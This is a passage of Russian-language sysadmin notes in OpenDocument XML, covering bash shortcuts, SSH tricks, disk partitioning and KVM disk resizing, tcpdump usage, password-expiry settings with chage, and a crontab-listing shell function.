      <text:p text:style-name="P1">Tab, tab или Alt + ?(Shift+/) Представление вариантов автодополнения</text:p>
      <text:p text:style-name="P1">Backspace, Ctrl + h Удаление символа перед курсором</text:p>
      <text:p text:style-name="P1">Ctrl + d Удалить символ за курсором</text:p>
      <text:p text:style-name="P1">Ctrl + w или Alt + Backspace Удалить все символы от курсора до пробела слева</text:p>
      <text:p text:style-name="P1">Alt + d, Esc + d Удалить символы от курсора до конца слова</text:p>
      <text:p text:style-name="P1">Ctrl + y Вставить слова, которые были удалены с помощью Alt+d, Ctrl+w</text:p>
      <text:p text:style-name="P1">Alt + \ Удалить любое количество пробелов вместе, где стоит курсор.</text:p>
      <text:p text:style-name="P1">Alt + r, Esc + r Отменить все изменения внесенные в строку</text:p>
      <text:p text:style-name="P1">Alt + c Изменить регистр буквы под курсором на заглавный и переместить курсор в конец слова</text:p>
      <text:p text:style-name="P1">Alt + u Изменить регистр всех букв от курсора до конца слова на верхний регистр</text:p>
      <text:p text:style-name="P1">Alt + l Изменить регистр всех букв от курсора до конца слова на нижний регистр</text:p>
      <text:p text:style-name="P1">Alt + t Поменять местами слово под курсором и предыдущее слово</text:p>
      <text:p text:style-name="P1">Ctr + t Переместить символ перед курсором под курсор</text:p>
      <text:p text:style-name="P1">Ctrl + _(Sift+-) Откат редактирования (Undo)</text:p>
      <text:p text:style-name="P1">Сочетания клавиш для просмотра истории команд. История команд:</text:p>
      <text:p text:style-name="P1">Ctrl + r Поиск ранее введенной команды в истории</text:p>
      <text:p text:style-name="P1">↑, ↓ или Ctrl + p, Ctrl + n Перемещение по истории ранее введенных команд и путей</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Ctrl + o Вызвать последнею введенную команду</text:span></text:p>
      <text:p text:style-name="P1">Alt + . или Esc + . Вставить аргумент команды, выполненной ранее</text:p>
      <text:p text:style-name="P23">Alt + &lt; (Shift+,) Повторить первую команду в буфере истории</text:p>
      <text:p text:style-name="P23">Сочетания клавиш для управления выводом информации на экран. Вывод на экран:</text:p>
      <text:p text:style-name="P1">Ctrl + l Очистка окна терминала</text:p>
      <text:p text:style-name="P1">Ctrl + s Заморозить терминал</text:p>
      <text:p text:style-name="P1">Ctrl + q Продолжить работу терминала</text:p>
      <text:p text:style-name="P1">Ctrl + c Прервать работу терминальной утилиты</text:p>
      <text:p text:style-name="P1">Ctrl + z Перевести работу терминальной утилиты в фоновый режим</text:p>
      <text:p text:style-name="P4">Ctrl + d Выйти из командной оболочки bash</text:p>
      <text:p text:style-name="P1">Cамые нужные команд SSH. Чтобы выполнить всего одну удаленную команду, совсем не обязательно подключаться к SSH, вводить команду, а затем отключаться. Можно сделать это сразу. Например, так можно посмотреть заполненность ФС удаленной машины:</text:p>
      <text:p text:style-name="P1">$ ssh user@host df -h</text:p>
      <text:p text:style-name="P1">А такперезагрузить ее:</text:p>
      <text:p text:style-name="P1">$ ssh user@host sudo reboot</text:p>
      <text:p text:style-name="P1">Составляй списки команд и запускай их разом. Если у тебя есть целый список команд, которые следует выполнить, их можно записать в файл и скормить этот файл SSH:</text:p>
      <text:p text:style-name="P1">$ ssh user@host "`cat file.txt`"</text:p>
      <text:p text:style-name="P1">Редактируй удаленные файлы локальным редактором. Чтобы отредактировать файл на удаленной машине, не требуется заходить на нее и использовать консольный редактор. На самом деле файл можно открыть в твоем любимом текстовом редакторе на локальной машине (gvim заменяем на свой редактор):</text:p>
      <text:p text:style-name="P1">$ gvim scp://user@host//путь/к/файлу</text:p>
      <text:p text:style-name="P1">Копируй содержимое удаленного файла в буфер обмена. Если необходимо скопировать содержимое удаленного файла или вывод команды в буфер обмена, не обязательно выводить его на экран или открывать в текстовом редакторе и копировать вручную. Можно использовать следующую команду:</text:p>
      <text:p text:style-name="P1">$ ssh user@host cat /путь/к/файлу | xclip</text:p>
      <text:p text:style-name="P1">А так можно скопировать вывод команды:</text:p>
      <text:p text:style-name="P1">$ ssh user@host uname -a | xclip</text:p>
      <text:p text:style-name="P1">Сравнивай удаленный и локальный файл без копирования. Похожий прием можно использовать для сравнения двух файлов:</text:p>
      <text:p text:style-name="P1">$ ssh user@host cat /путь/к/удаленному/файлу | diff /путь/к/лoкальному/файлу -</text:p>
      <text:p text:style-name="P1">Работай с удаленными файлами с помощью локального файлового менеджера. Не всегда удобно работать с большим количеством файлов с помощью консольных команд или mc, запущенного на удаленной машине. Но всегда можно подключить любой каталог удаленной машины как сетевой диск. Для этого достаточно установить sshfs:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">$ sudo apt-get install sshfs</text:span></text:p>
      <text:p text:style-name="P1">Создать каталог для подключения «сетевого диска»:</text:p>
      <text:p text:style-name="P1">$ mkdir remote_files</text:p>
      <text:p text:style-name="P1">И подключить его:</text:p>
      <text:p text:style-name="P1">$ sshfs user@host:/home/user ~/remote_files/</text:p>
      <text:p text:style-name="P23">Теперь все файлы удаленного каталога /home/user будут видны в каталоге ~/remote_files/ и с ними можно работать, как с обычными.</text:p>
      <text:p text:style-name="P23">Копируй ключи быстро. Хоть и копирование публичного ключа на удаленный серверзадача простая, но она требует выполнения нескольких действий вручную. Если тебя это напpягает, скопировать ключ можно в автоматическом режиме:</text:p>
      <text:p text:style-name="P1">$ ssh-copy-id user@host</text:p>
      <text:p text:style-name="P1">При этом не обязательно копировать основной ключ, с помощью флага -i можно указать любой другой:</text:p>
      <text:p text:style-name="P1">$ ssh-copy-id -i ~/my_key.pub user@host</text:p>
      <text:p text:style-name="P1">Создай постоянное соединение с машиной. Если в течение дня ты часто подключаешься к одной машине, в том числе на несколько минут или секунд (чтобы просто запустить одну команду, например), есть смысл создать с ней постоянное соединение. Твой комп будет держать соединение открытым и использовать его для каждого подключения к машине. Это намного быстрее и экономичнее с точки зрения трафика и нагрузки на процессор. Добавь следующие строки в ~/.ssh/config:</text:p>
      <text:p text:style-name="P1">Host host</text:p>
      <text:p text:style-name="P1">ControlPath ~/.ssh/master-%r@%h:%p</text:p>
      <text:p text:style-name="P1">ControlMaster no</text:p>
      <text:p text:style-name="P1">А затем создай соединение:</text:p>
      <text:p text:style-name="P4">$ ssh -MNf user@host</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T3">Файловые системы \ FS \ sfdisk \ e2label \ mkfs \: ext3 - Наиболее распространенная файловая система Linux, предоставляющая возможность журналирования с целью сохранения данных и возможность быстро перезагружать систему после некорректного завершения ее работы. ext2 - Файловая система, предшествующая ext3, не поддерживающая функцию журналирования. iso9660 - появилась из файловой системы High Sierra (была стандартом для компакт-дисков) и может содержать расширения Rock Ridge для обеспечения возможности использования длинных имен файлов и других функций (полномочия доступа к файлу, права собственности и ссылки). jffs2 - Журналируемая файловая система для флэш-носителей, созданная для эффективной работы с USB-накопителями. jfs - Файловая система, используемая на IBM в OS/2 Warp и настроенная на работу с большими файловыми системами и средами с высокой производительностью. msdos - Может использоваться для монтирования файловых систем на устаревшие носители MS-DOS, например старые дискеты. ntfs - Может быть полезна, когда есть необходимость передавать файлы в файловые системы Windows (с двойной загрузкой или на сменных носителях). reiserfs - Журналируемая файловая </text:span><text:soft-page-break/><text:span text:style-name="T3">система, иногда используемая по умолчанию на SUSE, Slackware и других операционных системах Linux. squashfs - Запакованная файловая система, предназначенная только для чтения данных и используемая на многих Live CD Linux. swap - Используется на разделах подкачки для временного хранения данных, когда оперативная память временно недоступна. ufs - Популярная файловая система операционных систем Solaris и SunOS от корпорации Sun Microsystems. vfat - Расширенная файловая система FAT (VFAT), которая полезна, если файловым системам нужно обмениваться файлами с более старыми системами Windows (с двойной загрузкой или на сменных носителях). xfs - Журналируемая файловая система для среды с высокой производительностью, размер которой может расширяться до многих терабайт данных, а скорость передачи данных в которой исчисляется гигабайтами в секунду</text:span></text:p>
      <text:p text:style-name="P23">sfdisk - программа для работы с таблицей разделов жесткого диска</text:p>
      <text:p text:style-name="P1">sfdisk -d /dev/sda &gt; sda-table - Выполняет резервное копирование таблицы разбиения в файл </text:p>
      <text:p text:style-name="P1">sfdisk /dev/sda &lt; sda-table - Восстанавливает таблицу разбиения из файла</text:p>
      <text:p text:style-name="P1">sfdisk -d /dev/sda | sfdisk /dev/sdb - Копирует таблицу разбиения с одного диска на другой</text:p>
      <text:p text:style-name="P1">fdisk - <text:s/>программа для работы с таблицей разделов жесткого диска (устарела)</text:p>
      <text:p text:style-name="P1">e2label /dev/sda2 - посмотреть метку второго раздела</text:p>
      <text:p text:style-name="P1">e2label /dev/sda2 my_lable_name - <text:s/>назначить метку my_lable_name второму разделу</text:p>
      <text:p text:style-name="P1">findfs LABEL=my_lable_name - ищем раздел по метке (например в /etc/fstab монтирование по метке)</text:p>
      <text:p text:style-name="P1">mkfs -t ext3 /dev/sdb1 - Создает файловую систему ext3 на разделе sba1</text:p>
      <text:p text:style-name="P1">mkfs -t ext3 -v -c /dev/sdb1 - Расширенная команда, выполняющая также поиск поврежденных блоков </text:p>
      <text:p text:style-name="P1">mkfs.ext3 -с /dev/sdb1 - Создает файловую систему ext3 на разделе sba1</text:p>
      <text:p text:style-name="P1">mkfs.ext3 -с -L mypartition /dev/sdb1 - Создает файловую систему ext3 на разделе sba1 и добавляет разделу метку <text:s text:c="4"/></text:p>
      <text:p text:style-name="P1">dd if=/dev/scd0 of=name_file.iso bs=2048 - извлекаем образ iso с cd/dvd </text:p>
      <text:p text:style-name="P1">dd if=/dev/zero of=my_disk count=2048000 - Создаем заполненный нулями файл объемом 1 Гбайт</text:p>
      <text:p text:style-name="P1">du -sh my_disk - Проверяем размер виртуальной файловой системы</text:p>
      <text:p text:style-name="P1">mkfs -t ext3 my_disk - Создаем файловую систему на mydisk</text:p>
      <text:p text:style-name="P1">mkdir /mnt/image <text:s/>- создаем пустой каталог</text:p>
      <text:p text:style-name="P1">mount -o loop my_disk /mnt/image - монтируем my_disk в пустой каталог </text:p>
      <text:p text:style-name="P1">cd /mnt/image <text:s/>- переходим в каталог /mnt/image</text:p>
      <text:p text:style-name="P1">mkdir test - создаем каталог test </text:p>
      <text:p text:style-name="P1">cp /etc/hosts - копируем /etc/hosts в текущий каталог</text:p>
      <text:p text:style-name="P1">cd .. - переходим на уровень выше (выходим из текущего каталога)</text:p>
      <text:p text:style-name="P4">umount /mnt/image - отмонтмровать /mnt/image</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">HDD tools:</text:span></text:p>
      <text:p text:style-name="P1">gsmartcontrol - графическая программа проверки диска (SMART)</text:p>
      <text:p text:style-name="P1">smartmontools - консольная программа для проверки и контроля диска (SMART)</text:p>
      <text:p text:style-name="P1">parted - работа с таблицей разделов, аналог fdisk (еще есть partx)</text:p>
      <text:p text:style-name="P1">partman - разметка диска (поддерживает LVM) (Это предпочтительная утилита)</text:p>
      <text:p text:style-name="P1">partitioner - разметить диск</text:p>
      <text:p text:style-name="P1">fdisk - разметка диска </text:p>
      <text:p text:style-name="P1">ls -l /dev/disk/by-uuid - вот так узнать UUID жесткого диска для файла /etc/fstab</text:p>
      <text:p text:style-name="P1">blkid - вот так узнать UUID жесткого диска для файла /etc/fstab</text:p>
      <text:p text:style-name="P1">cat /proc/partitions - Все зарегистрированные разделы (Linux)</text:p>
      <text:p text:style-name="P1">mount - Смонтированные файловые системы</text:p>
      <text:p text:style-name="P1">mount | column -t <text:s/>- Смонтированные файловые системы</text:p>
      <text:p text:style-name="P23">df - Свободное пространство на дисках</text:p>
      <text:p text:style-name="P25">Эти утилиты предоставляют важные возможности для анализа и отладки сетевых проблем в различных операционных системах. Windows: tracert - стандартная утилита в Windows для трассировки маршрута, которая известна многим. tracert google.com. pathping - это встроенный в Windows аналог утилиты mtr с аналогичной функциональностью, но поддерживающий только icmp запросы. Обычно он уже установлен в системе, и его не требуется устанавливать отдельно. pathping google.com. tracetcp - это виндовая утилита, которая может выполнять tcp syn запросы по маршруту следования пакетов. Она помогает определить доступность определенного порта и может указать, где именно блокируется этот порт. Для установки этой утилиты потребуется скачать ее с официального сайта и установить вручную. tracetcp google.com:443. Linux: traceroute - это стандартная утилита Linux, предназначенная для трассировки маршрута. По умолчанию она использует протокол udp, но вы можете выполнить трассировку с использованием протокола icmp следующим образом. traceroute -I google.com. tracepath - аналогична утилите traceroute, но использует протокол udp и сразу выводит значения mtu и маршрутизаторы, где происходит изменение mtu. tracepath google.com. mtr - эта утилита объединяет функциональность утилит ping и traceroute. Она может использовать протоколы tcp, udp и icmp. В операционной системе Windows есть аналог с названием Winmtr. mtr -c3 google.com</text:p>
      <text:p text:style-name="P26">KVM изменить размер диска / blockresize / domblklist / guests linux / mbr /gpt?</text:p>
      <text:p text:style-name="P26">Изменение диска offline / qemu-img</text:p>
      <text:p text:style-name="P26">!!! не забываем делать backup</text:p>
      <text:p text:style-name="P26">qemu-img resize vmdisk.qcow2 +10G - добавим 10Гб диску vmdisk.img</text:p>
      <text:p text:style-name="P26">Изменение диска online / blockresize</text:p>
      <text:p text:style-name="P26">virsh blockresize &lt;domain&gt; &lt;path&gt; &lt;size&gt;</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>[--domain] &lt;строка&gt; <text:s/>имя домена, ID или UUID</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"><text:s text:c="3"/>[--path] &lt;строка&gt; <text:s/>Полный путь к блочному устройству</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>[--size] &lt;число&gt; <text:s/>Новый размер блочного устройства, кратный целому числу (по умолчанию в КиБ)</text:p>
      <text:p text:style-name="P26">virsh domblklist name_VM - узнаем какие диски есть у ВМ</text:p>
      <text:p text:style-name="P26">virsh blockresize name_VM /kvm/name_VM_disk.qcow2 100G - для ВМ (name_VM), изменим размер диска равный 100Гб</text:p>
      <text:p text:style-name="P26">Необходимые действия для гостя, при изменении диска, MBR диск / один раздел / fdisk:</text:p>
      <text:p text:style-name="P26">!!! Не забываем делать backup </text:p>
      <text:p text:style-name="P26">!!! Внимание пример для одного диска с одним разделом</text:p>
      <text:p text:style-name="P26">!!! fdisk -l - посмотреть доступные</text:p>
      <text:p text:style-name="P26">fdsik /dev/sda - редактируем таблицу разделов</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>: p - показываем таблицу разделов</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>Устр-во <text:s text:c="3"/>Загрузочный Start Конец Секторы Size Id Тип</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>/dev/sda1 <text:s/>* <text:s text:c="11"/>2048 14678015 14675968 <text:s text:c="2"/>7G 83 Linux</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>: d - удаляем таблицу разделов</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>: n - создаем таблицу разделов</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>Do you want to remove the signature? [Y]es/[N]o: N - не удаляем сигнатуры</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>: a - ставим ставим загрузочный бит</text:p>
      <text:p text:style-name="P27"><text:s text:c="3"/>: w - применяем изменения</text:p>
      <text:p text:style-name="P27">!!! после выхода из (fdisk) будет сказано что изменена таблица разделов и необходимо выполнить partprobe</text:p>
      <text:p text:style-name="P26">(name_VM)# partprobe - выполняем просим систему перечитать таблицу разделов</text:p>
      <text:p text:style-name="P26">(name_VM)# resize2fs /dev/sda1 - выполняем изменения FS</text:p>
      <text:p text:style-name="P26">Необходимые действия для гостя, при изменении диска, MBR диск / несколько разделов / parted:</text:p>
      <text:p text:style-name="P26">!!! Не забываем делать backup </text:p>
      <text:p text:style-name="P26">!!! Внимание пример для одного диска и нескольких разделов</text:p>
      <text:p text:style-name="P26">!!! fdisk -l - посмотреть доступные</text:p>
      <text:p text:style-name="P26">Пример (parted)</text:p>
      <text:p text:style-name="P26">(name_VM)# parted /dev/vda - открываем нужный диск</text:p>
      <text:p text:style-name="P26"><text:s text:c="11"/>(parted) print free - покажем доступные <text:s/>разделы (диск /dev/vda)</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>Number Start End Size Type File system Flags</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>1 32.3kB 4295MB 4295MB primary ext4 boot</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>2 4295MB 8590MB 4295MB primary linux-swap(v1)</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>3 8590MB 107GB 98GB primary ext4</text:p>
      <text:p text:style-name="P26"><text:s text:c="17"/>107GB 215GB 107GB Free Space</text:p>
      <text:p text:style-name="P26"><text:s text:c="11"/>(parted) resizepart 3 - изменяем размер третьего раздела</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>End [107GB]? 215GB</text:p>
      <text:p text:style-name="P26"><text:s text:c="11"/>(parted) quit - выходим из parted</text:p>
      <text:p text:style-name="P26">(name_VM)#partprobe - выполняем просим систему перечитать таблицу разделов</text:p>
      <text:p text:style-name="P26">(name_VM)#resize2fs /dev/vda3 - <text:s/>выполняем изменения FS</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Необходимые действия для гостя, при изменении диска, GBT диск / несколько разделов / parted:</text:span></text:p>
      <text:p text:style-name="P26">!!! GPT Рассматривается схема с одним разделом (/dev/vdb1) на весь диск</text:p>
      <text:p text:style-name="P26">(name_VM)#partprobe</text:p>
      <text:p text:style-name="P26">(name_VM)#gdisk /dev/vdb</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>переходим в расширенный режим x</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>смещаем запись в конец диска e</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>выходим из расширенного режима m</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Command (? for help): d</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Using 1</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Command (? for help): n</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Partition number (1-128, default 1): [Enter]</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>First sector (34-2147483614, default = 2048) or {+-}size{KMGTP}: [Enter]</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Last sector (2048-2147483614, default = 2147483614) or {+-}size{KMGTP}: [Enter]</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Current type is 'Linux filesystem'</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Hex code or GUID (L to show codes, Enter = 8300): [Enter]</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>Changed type of partition to 'Linux filesystem'</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>выходим с сохранением w</text:p>
      <text:p text:style-name="P26">(name_VM)#partprobe</text:p>
      <text:p text:style-name="P26">(name_VM)#resize2fs /dev/vdb1</text:p>
      <text:p text:style-name="P26">или</text:p>
      <text:p text:style-name="P27">btrfs filesystem resize max /&lt;MOUNTPOINT&gt;</text:p>
      <text:p text:style-name="P27">Смонтировать образ диска qcow2 в гипервизоре:</text:p>
      <text:p text:style-name="P26">modprobe nbd max_part=8</text:p>
      <text:p text:style-name="P26">qemu-nbd --connect=/dev/nbd0 &lt;PATH-TO-IMAGE&gt;.qcow2</text:p>
      <text:p text:style-name="P26">fdisk /dev/nbd0 -l</text:p>
      <text:p text:style-name="P26">mount -o ro /dev/nbd0p1 /mnt/ext0</text:p>
      <text:p text:style-name="P26">umount /mnt/ext0</text:p>
      <text:p text:style-name="P26">qemu-nbd --disconnect /dev/nbd0</text:p>
      <text:p text:style-name="P28">rmmod nbd</text:p>
      <text:p text:style-name="P26">tcpdump / снифер / sniffer</text:p>
      <text:p text:style-name="P26">Примеры использования tcpdump:</text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 # слушаем интерфейс eth0</text:p>
      <text:p text:style-name="P26">tcpdump port 80 # слушаем 80 порт <text:s text:c="12"/></text:p>
      <text:p text:style-name="P26">tcpdump host google.com # слушаем трафик с хоста google.com</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth0 icmp # Ловим пакеты icmp (ping pong)</text:p>
      <text:p text:style-name="P26">tcpdump | grep -v ssh # поиск пакетов исключая пакеты ssh</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth0 net 192.168.1.15 # трафик с/на IP</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth0 net 192.168.1.0/24 # трафик с/в сеть</text:p>
      <text:p text:style-name="P26">tcpdump -l &gt; dump &amp;&amp; tail -f dump # Вывод с записью в файл</text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 -w traffic.eth0 # Информация о трафике записывается в бинарный файл traffic.eth0</text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 -s 0 -w traffic.eth0 # Запись + загрузка в бинарный файл</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">tcpdump -r traffic.eth0 # Читаем из файла</text:span></text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 -X port \(110 or 143\) # Проверка pop и imap на безопасность</text:p>
      <text:p text:style-name="P26">tcpdump -i eth0 -s 0 -A port 80 | grep GET # (-s 0 весь пакет, -A для ASCII)</text:p>
      <text:p text:style-name="P26">tcpdump -npi iface_name ether src MAC-address # узнать MAC устройства iface_name -имя интерфейса MAC-address -мак адрес устройства</text:p>
      <text:p text:style-name="P26">tcpdump -vvv -s 0 -l -n port 53 # показываем DNS трафик</text:p>
      <text:p text:style-name="P26">tcpdump -nl -i bge0 not port ssh and src \(192.168.16.121 or 192.168.16.54\)</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth1 net 192.168.16.121 # Выборка входящий/исходящий по одному IP адресу</text:p>
      <text:p text:style-name="P26">tcpdump -n -i eth1 net 192.168.16.0/24 # Выборка входящий/исходящий по адресу сети</text:p>
      <text:p text:style-name="P26">tcpdump -l &gt; dump &amp;&amp; tail -f dump # Вывод через буфер</text:p>
      <text:p text:style-name="P26">tcpdump -i rl0 -w traffic.rl0 # Писать заголовки в бинарный файл</text:p>
      <text:p text:style-name="P26">tcpdump -i rl0 -s 0 -w traffic.rl0 # Писать в бинарный фйл полные пакеты</text:p>
      <text:p text:style-name="P26">tcpdump -r traffic.rl0 # Прочитать из файла (так-же для ethereal</text:p>
      <text:p text:style-name="P28">tcpdump -i eth0 -s 0 -A port 80 | grep GET # -s 0 для полных пакетов, -A для ASCII</text:p>
      <text:p text:style-name="P25">Подборка утилит сканирования Linux на уязвимости и вредоносы: https://github.com/radareorg/radare2/; https://rkhunter.sourceforge.net/; https://github.com/stamparm/maltrail; https://cisofy.com/lynis/; https://www.rfxn.com/projects/linux-malware-detect/; https://www.chkrootkit.org/; https://www.clamav.net/; https://remnux.org/; http://download-mirror.savannah.gnu.org/releases/tiger/; https://github.com/virustotal/yara.</text:p>
      <text:p text:style-name="P27">Загружаем видео с YouTube, используя Python. YouTube стал сокровищницей образовательного контента, развлечений и многого другого. Когда вам потребуется скачать видео, можете сделать это с помощью Python и библиотеки Pytube. Сначала убедитесь, что у вас установлен Pytube. Если вы еще этого не сделали, вы можете легко установить его с помощью pip, прописав в терминале: «pip install pytube». Создайте простой скрипт python (файл с расширением .py):</text:p>
      <text:p text:style-name="P26">"""</text:p>
      <text:p text:style-name="P26">from pytube import YouTube</text:p>
      <text:p text:style-name="P26">video_url = "https://www.youtube.com/watch?v=hgI0p1zf31k"</text:p>
      <text:p text:style-name="P26">yt = YouTube(video_url)</text:p>
      <text:p text:style-name="P26">stream = yt.streams.get_highest_resolution()</text:p>
      <text:p text:style-name="P26">output_path = "path/to/output/directory/"</text:p>
      <text:p text:style-name="P26">stream.download(output_path)</text:p>
      <text:p text:style-name="P26">"""</text:p>
      <text:p text:style-name="P28">Измените этот скрипт, заменив адрес ролика и путь, куда будет сохранено видео. Запустите скрипт в терминале командой «python file.py» и видео будет скачано на ваш компьютер.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Как заставить пользователя изменить пароль при следующем входе в систему?</text:span></text:p>
      <text:p text:style-name="P26">Использование команды passwd - sudo passwd --expire [username]</text:p>
      <text:p text:style-name="P26">Использование команды chage - sudo chage --lastday 0 [username]</text:p>
      <text:p text:style-name="P26">Срок действия паролей - chage -l. Будет выведена следующая информация: Когда пароль был последний раз изменен; Дата окончания действия пароля; Сколько дней осталось до окончания действия пароля; Когда учетная запись пользователя будет закончена (можно, пожалуйста, далее мы будем говорить «заэкспайрится»?); Минимальное количество дней между итерацией смены пароля; Максимальное количество дней между итерацией смены пароля.</text:p>
      <text:p text:style-name="P26">Заставляем пользователя менять пароль каждые 90 дней - sudo chage -M 90</text:p>
      <text:p text:style-name="P26">Задаем срок жизни учетной записи (до 12 июня 2023) - sudo chage -E 2023-06-12 serg</text:p>
      <text:p text:style-name="P26">Сколько времени на смену пароля?</text:p>
      <text:p text:style-name="P26">В примере даем Борису 10 дней на смену пароля с момента как пароль заэкспайрился</text:p>
      <text:p text:style-name="P26">sudo chage -I 10 boris</text:p>
      <text:p text:style-name="P26">Уведомление о смене пароля заранее. Через 25 дней истекает срок годности пароля Бориса - sudo chage -W 25 boris</text:p>
      <text:p text:style-name="P26">Защищаемся от частой смены паролей пользователя. Минимальное количество дней между сменой паролей - sudo chage -m 25 boris</text:p>
      <text:p text:style-name="P28">Удалить ограничение в днях - sudo chage -m 0 sergey</text:p>
      <text:p text:style-name="P26">Скрипт / копирование файла из сетевого хранилища в каталог c:\users\public\desktop\ на разные ПК. Как оно работает:</text:p>
      <text:p text:style-name="P26">c:\users\public\desktop\ ---- файлы из этого каталога будут видны всем пользователям на данном пк</text:p>
      <text:p text:style-name="P26">chcp 1251 &gt;nul <text:s/>--- нужно для решение проблемы с кодировкой</text:p>
      <text:p text:style-name="P27">set listfile=host.txt --- список компов (комп = одна строка)</text:p>
      <text:p text:style-name="P27">for /f "tokens=1" %%i in (%listfile%) do call :procedure %%i - цикл (проходит по списку)</text:p>
      <text:p text:style-name="P26">:procedure</text:p>
      <text:p text:style-name="P26">copy "\\fileserv\files\file1.lnk" "\\%1\c$\users\public\Desktop\" - выполнение команды</text:p>
      <text:p text:style-name="P26">Создаем файл copy_file_for_desktops_users.cmd</text:p>
      <text:p text:style-name="P26">chcp 1251 &gt;nul</text:p>
      <text:p text:style-name="P26">set listfile=host.txt</text:p>
      <text:p text:style-name="P26">for /f "tokens=1" %%i in (%listfile%) do call :procedure %%i</text:p>
      <text:p text:style-name="P26">:procedure</text:p>
      <text:p text:style-name="P26">copy "\\fileserv\files\file1.lnk" "\\%1\c$\users\public\Desktop\"</text:p>
      <text:p text:style-name="P26">Создаем файл host.txt</text:p>
      <text:p text:style-name="P26">Comp 1</text:p>
      <text:p text:style-name="P26">Comp 2</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Comp 3</text:span></text:p>
      <text:p text:style-name="P26">Comp 4</text:p>
      <text:p text:style-name="P26">Comp 5</text:p>
      <text:p text:style-name="P28">Comp 6</text:p>
      <text:p text:style-name="P26">Вывод cron всех пользователей. Вывод задач в cron для текущего пользователя осуществляется просто: crontab -l. Список задач другого пользователя (например, oracle) можно посмотреть так: crontab -u oracle -l. Но иногда требуется посмотреть список задач в cron для всех пользователей, сделать это можно следующей командой: for user in $(cut -d':' -f1 /etc/passwd); do crontab -u $user -l; done. Если это требуется не единожды, а постоянно, можно написать небольшой скрипт, для этого в файле ~/.bashrc прописываем:</text:p>
      <text:p text:style-name="P26"># Цвета вывода</text:p>
      <text:p text:style-name="P26">red='\e[0;31m'</text:p>
      <text:p text:style-name="P26">RED='\e[1;31m'</text:p>
      <text:p text:style-name="P26">green='\e[0;32m'</text:p>
      <text:p text:style-name="P26">GREEN='\e[1;32m'</text:p>
      <text:p text:style-name="P26">NC='\e[0m'</text:p>
      <text:p text:style-name="P26"><text:s/># Определение функции вывода задач cron всех пользователей</text:p>
      <text:p text:style-name="P26">function allcrontab() {</text:p>
      <text:p text:style-name="P26"><text:s text:c="5"/>for user in $(cut -d':' -f1 /etc/passwd); do</text:p>
      <text:p text:style-name="P26"><text:s text:c="10"/>usercrontab=$(crontab -l -u ${user} 2&gt;/dev/null)</text:p>
      <text:p text:style-name="P26"><text:s text:c="10"/>if [ -n "${usercrontab}" ]; then</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>echo -e "${RED}====== Start crontab for user ${NC}${GREEN}${user}${NC} ${RED}======${NC}"</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>crontab -l -u ${user} | sed '/ *#/d; /^ *$/d'</text:p>
      <text:p text:style-name="P26"><text:s text:c="15"/>echo -e "${RED}====== End crontab for user ${NC}${GREEN}${user}${NC} ${RED}========${NC}\n"</text:p>
      <text:p text:style-name="P26"><text:s text:c="10"/>fi</text:p>
      <text:p text:style-name="P26"><text:s text:c="5"/>done</text:p>
      <text:p text:style-name="P27">}</text:p>
      <text:p text:style-name="P27">Выполнив source ~/.bashrc или просто перелогинившись в консоли, можем выполнить команду allcrontab и получить красивый вывод списка задач cron всех пользователей в системе.</text:p>
      <text:p text:style-name="P26">ТОП-5 систем обнаружения и предотвращения вторжений (IPS/IDS). IDS/IPS - системы обнаружения и предотвращения вторжений используются для защиты от сетевых атак. Основное различие между ними в том, что IDS - это система мониторинга, а IPS - система управления. Они так тесно связаны друг с другом, что их часто объединяют в названии - IDPS:</text:p>
      <text:p text:style-name="P26">1. Snort (https://www.snort.org/) - это бесплатная система предотвращения сетевых вторжений (NIPS) и система обнаружения сетевых вторжений (NIDS). В 2009 году Snort вошел в Зал славы открытого исходного кода InfoWorld как один из «величайших [предметов] программного обеспечения всех времен».</text:p>
